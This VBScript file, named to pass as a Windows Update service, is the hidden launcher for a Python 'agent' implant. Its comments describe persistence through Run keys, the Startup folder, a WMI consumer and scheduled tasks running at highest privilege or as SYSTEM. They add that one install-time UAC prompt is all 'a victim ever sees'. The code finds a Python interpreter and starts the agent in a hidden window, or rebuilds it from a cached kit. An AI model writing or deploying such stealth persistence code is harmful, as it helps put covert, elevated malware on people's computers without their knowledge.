' WindowsUpdateService.vbs -- windowless autostart launcher.
'
' Every autostart vector (both Run values, the Startup folder entry, the WMI
' consumer) goes through this file, and every one of them passes --no-elevate.
' Elevation therefore has exactly two sources, and neither of them prompts:
'
'   1. the ONLOGON scheduled task, created /RL HIGHEST /IT /RU <user>
'   2. the ONSTART scheduled task, created /RU SYSTEM
'
' The install-time UAC prompt is the only prompt a victim ever sees.
'
' NOTE: this text is embedded in patch.py as a raw triple-quoted literal, so it must
' never contain three consecutive double quotes. Quotes inside a built command
' line therefore go through Chr(34).
Option Explicit

Dim shell, fso, here, agent, shim, py, pre, candidate, q
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
q = Chr(34)

here = fso.GetParentFolderName(WScript.ScriptFullName)
agent = fso.BuildPath(here, "agent.py")

' Nothing to run: hand off to the cmd shim, which knows how to rebuild from
' the cached kit.zip. Still windowless.
If Not fso.FileExists(agent) Then
    shim = fso.BuildPath(here, "WindowsUpdateService.cmd")
    If fso.FileExists(shim) Then
        shell.Run "cmd.exe /c " & q & shim & q, 0, False
    End If
    WScript.Quit 0
End If

py = ""
pre = ""
For Each candidate In Array("runtime\pythonw.exe", "runtime\python.exe", "pythonw.exe", "python.exe")
    If fso.FileExists(fso.BuildPath(here, candidate)) Then
        py = fso.BuildPath(here, candidate)
        Exit For
    End If
Next

If py = "" Then
    ' PATH fallback. pyw.exe needs -3; pythonw.exe must not have it.
    If OnPath("pyw.exe") Then
        py = "pyw.exe"
        pre = " -3"
    ElseIf OnPath("pythonw.exe") Then
        py = "pythonw.exe"
    ElseIf OnPath("python.exe") Then
        py = "python.exe"
    Else
        WScript.Quit 0
    End If
End If

' 0 = hidden window, False = do not wait. Never a console flash.
shell.Run q & py & q & pre & " " & q & agent & q & " --hidden --no-elevate", 0, False
WScript.Quit 0

Function OnPath(name)
    Dim rc
    On Error Resume Next
    rc = shell.Run("cmd.exe /c where " & name & " >nul 2>&1", 0, True)
    On Error GoTo 0
    OnPath = (rc = 0)
End Function
